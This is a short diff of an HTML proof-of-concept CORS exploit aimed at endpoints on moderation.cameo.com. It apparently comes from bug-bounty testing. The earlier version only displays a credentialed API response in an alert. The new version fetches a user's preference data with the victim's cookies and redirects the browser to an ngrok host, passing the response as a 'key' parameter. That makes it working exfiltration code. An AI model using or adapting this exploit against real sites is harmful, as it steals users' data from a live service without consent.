@@ -1,27 +1,13 @@
-<!DOCTYPE html>
 <html>
-<body>
-<center>
-<h2>CORS POC Exploit</h2>
-<h3>Extract SID</h3>
- 
-<div id="demo">
-<button type="button" onclick="cors()">Exploit</button>
-</div>
- 
 <script>
-function cors() {
-  var xhttp = new XMLHttpRequest();
-  xhttp.onreadystatechange = function() {
-    if (this.readyState == 4 && this.status == 200) {
-      document.getElementById("demo").innerHTML = alert(this.responseText);
-    }
-  };
-  xhttp.open("GET", "https://moderation.cameo.com/api/user/reactivate", true);
-  xhttp.withCredentials = true;
-  xhttp.send();
-}
+var req = new XMLHttpRequest(); 
+req.onload = reqListener; 
+req.open('get','https://moderation.cameo.com/api/user/636ecb1e1dc0232d0bb66c22/preferences/locale',true); 
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+    location='//3126-41-103-106-145.ngrok.io/log?key='+this.responseText; 
+};
 </script>
- 
-</body>
 </html>
